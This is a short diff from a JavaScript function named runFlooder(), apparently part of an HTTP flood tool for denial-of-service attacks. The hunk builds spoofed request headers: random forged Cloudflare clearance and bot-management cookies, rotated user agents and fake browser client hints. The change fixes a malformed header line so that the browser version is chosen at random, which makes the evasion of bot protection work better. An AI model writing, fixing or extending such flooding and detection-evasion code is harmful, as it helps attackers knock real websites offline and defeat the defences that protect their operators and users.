@@ -943,7 +943,7 @@ function runFlooder() {
         { "cache-control": "max-age=0" },
         { "user-agent": uap[Math.floor(Math.floor(Math.random() * uap.length))] },
         { "cookie": "cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1; _ga=" + randstr(20) + "; _gid=" + randstr(15) + "; __cf_bm=" + randstr(44) },
-        { "sec-ch-ua": '"Brave";v="149", "Chromium";v="149", "Not?A_Brand";v="24"','"Brave";v="150", "Chromium";v="150", "Not?A_Brand";v="24"','"Brave";v="148", "Chromium";v="148", "Not?A_Brand";v="24"' },
+        { "sec-ch-ua": randomElement(['"Brave";v="149", "Chromium";v="149", "Not?A_Brand";v="24"', '"Brave";v="150", "Chromium";v="150", "Not?A_Brand";v="24"', '"Brave";v="148", "Chromium";v="148", "Not?A_Brand";v="24"']) },
         { "sec-ch-ua-mobile": "?0" },
         { "sec-ch-ua-platform": '"Windows"' },
         { "sec-fetch-site": "cross-site" },
